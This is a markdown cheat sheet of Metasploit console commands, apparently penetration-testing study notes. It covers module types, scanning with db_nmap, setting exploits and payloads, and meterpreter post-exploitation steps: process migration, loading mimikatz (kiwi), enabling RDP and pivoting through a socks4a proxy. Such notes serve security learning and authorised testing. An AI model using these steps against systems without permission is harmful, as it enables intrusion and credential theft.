# Setup Database
* The database needs to be setup using `msfdb init`


# Console Basics
* To connect to the console: `msfconsole`

## Commands

### Help Menu
* To access the help menu: `?`

### Search
* To search for modules: `search`

### Select Module
* To select a module: `use`

### Module Information
* To view information about a module: `info`

### Connect
* Test to see if you can talk to a host: `connect`

### Variables
* To set a variable: `set`
* To set a global variable: `setg`
* To get a variable: `get`
* To set a variable to null/no value: `unset`

### Screen Cast
* Save the contents of the screen to a file: `spool`

### Save
* Save the current settings / active datastores to a file: `save`

## Modules
* There are six modules
* Modules not loaded can be loaded via `load`

## Exploit
* Holds exploit code

## Payload
* Contains shellcode to execute the expolit

## Auxiliary
* Scanning and verifiying machines are exploitable

## Post
* Loot and pivot

## Encoder
* Payload obfuscation
* Allows use to modify the "appearance" of the exploit to avoid signature detection

## NOP
* Used with buffer overflow and ROP attacks

# Basic Attack

## Nmap
* Metasploit has a built in way for nmap to run and save the results directly to the database. Use: `db_nmap`
* To view live hosts saved to the database: `hosts`
* List all of the found services: `services`
* List known vulnerabilities found: `vulns`

## Exploit
* To mount an exploit: `use <exploit>`
* To search for an exploit: `search <path>`
	* The number in the left hand column can be used as the exploit name in `use <exploit>`
* To set a payload: `set PAYLOAD <payload>`
* To set ip addresses of local and target: `set LHOST <ip address>` `set RHOSTS <target ip address>`
* To run the jobs: `run -j`
* To view running jobs: `jobs`
* To view active sessions: `sessions`
	* To connect to a session: `sessions -i <session number>`

## Post
* All of the following are in meterpriter
* To list the running processes: `ps`
* To transfer to another process: `migrate <pid>`
* Get user information: `getuid`
* Get system information: `sysinfo`
* To load mimikatz: `load kiwi`
* To find current user privileges: `getprivs`
* To upload files to the connected machine: `upload`
* To run a metasploit module: `run`
* Find networking information: `ipconfig` or `ifconfig`
* Determine if the victim is inside a VM: `run post/windows/gather/checkvm`
* Find possible exploits: `run post/multi/recon/local_exploit_suggester` Note: will take a while
* See if remote desktop protocol is available: `run post/windows/manage/enable_rdp`
* Enter the shell: `shell`

### Pivot
* Add route with a given subnet: `run autoroute -s x.x.x.x 255.255.255.0`
* socks4a
	* A proxy server
	* Path: `auxiliary/server/socks4a`
    * To access outside of metasploit: `proxychain`
